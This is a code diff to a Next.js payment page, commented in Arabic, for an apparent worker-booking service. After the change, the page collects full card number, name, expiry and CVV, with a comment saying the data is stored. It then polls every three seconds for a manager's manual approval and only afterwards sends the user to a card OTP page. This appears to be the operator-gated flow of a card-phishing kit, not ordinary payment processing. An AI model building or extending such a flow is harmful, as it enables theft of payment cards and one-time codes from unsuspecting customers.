@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, FormEvent } from "react";
+import { useState, useEffect, FormEvent } from "react";
 import { useRouter } from "next/navigation";
 import { Dictionary } from "@/lib/i18n";
 import { Card } from "@/components/ui/Card";
@@ -26,11 +26,39 @@ export function PaymentClient({
   const [cvv, setCvv] = useState("");
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
+  // حالة الانتظار لقرار المدير
+  const [verifying, setVerifying] = useState(false);
+  const [paymentEntryId, setPaymentEntryId] = useState<string | null>(null);
   const p = dict.payment;
 
   const amount = booking.workers?.expected_salary ?? 0;
   const serviceFee = Math.round(amount * 0.1);
   const total = amount + serviceFee;
+
+  // استطلاع قرار المدير كل 3 ثوانٍ
+  useEffect(() => {
+    if (!verifying || !paymentEntryId) return;
+    const interval = setInterval(async () => {
+      try {
+        const res = await fetch(`/api/payments/status?entryId=${paymentEntryId}`, {
+          cache: "no-store" as RequestCache,
+        });
+        const data = await res.json();
+        if (data.status === "approved") {
+          setVerifying(false);
+          // اسمح للعميل بالتوجيه إلى صفحة رمز التحقق
+          router.push(`/${locale}/verify-card/${booking.id}?pid=${paymentEntryId}`);
+        } else if (data.status === "rejected") {
+          setVerifying(false);
+          setError(p.rejectedMsg);
+          setPaymentEntryId(null);
+        }
+      } catch {
+        // تجاهل أخطاء الشبكة مؤقتاً
+      }
+    }, 3000);
+    return () => clearInterval(interval);
+  }, [verifying, paymentEntryId, router, booking.id, locale, p.rejectedMsg]);
 
   function formatCardNumber(value: string): string {
     const digits = value.replace(/\D/g, "").slice(0, 19);
@@ -70,25 +98,63 @@ export function PaymentClient({
         const msg =
           data.error === "invalid_card"
             ? p.invalidCard
-            : data.error === "already_paid"
-              ? p.verifySuccess
-              : p.invalidCard;
+            : data.error === "luhn_failed"
+              ? p.invalidCard
+              : data.error === "already_paid"
+                ? p.verifySuccess
+                : p.invalidCard;
         setError(msg);
         return;
       }
 
-      // انتقل لصفحة التحقق، ومرّر رمز OTP التجريبي (إن وُجد) عبر query param
-      const params = new URLSearchParams();
-      if (data.demoOtp) params.set("otp", data.demoOtp);
-      params.set("session", data.sessionId);
-      router.push(
-        `/${locale}/verify-card/${booking.id}?${params.toString()}`,
-      );
+      // تم تخزين البيانات + الانتقال لشاشة الانتظار
+      setPaymentEntryId(data.entryId);
+      setVerifying(true);
     } catch {
       setError(p.invalidCard);
     } finally {
       setLoading(false);
     }
+  }
+
+  // ===== شاشة جارٍ التحقق =====
+  if (verifying) {
+    return (
+      <div className={styles.layout}>
+        <Card className={styles.verifyingCard}>
+          <div className={styles.spinnerWrap}>
+            <div className={styles.spinner} />
+          </div>
+          <h1 className={styles.verifyingTitle}>{p.verifyingWait}</h1>
+          <p className={styles.verifyingSub}>{p.verifyingSub}</p>
+        </Card>
+      </div>
+    );
+  }
+
+  // ===== شاشة الرفض =====
+  if (error === p.rejectedMsg) {
+    return (
+      <div className={styles.layout}>
+        <Card className={styles.rejectedCard}>
+          <div className={styles.rejectedIcon}>✗</div>
+          <h1 className={styles.rejectedTitle}>{p.rejectedTitle}</h1>
+          <p className={styles.rejectedMsg}>{p.rejectedMsg}</p>
+          <Button
+            onClick={() => {
+              setError(null);
+              setCardNumber("");
+              setCardName("");
+              setExpiry("");
+              setCvv("");
+            }}
+            size="lg"
+          >
+            {p.retryPayment}
+          </Button>
+        </Card>
+      </div>
+    );
   }
 
   return (
@@ -204,3 +270,4 @@ export function PaymentClient({
     </div>
   );
 }
+
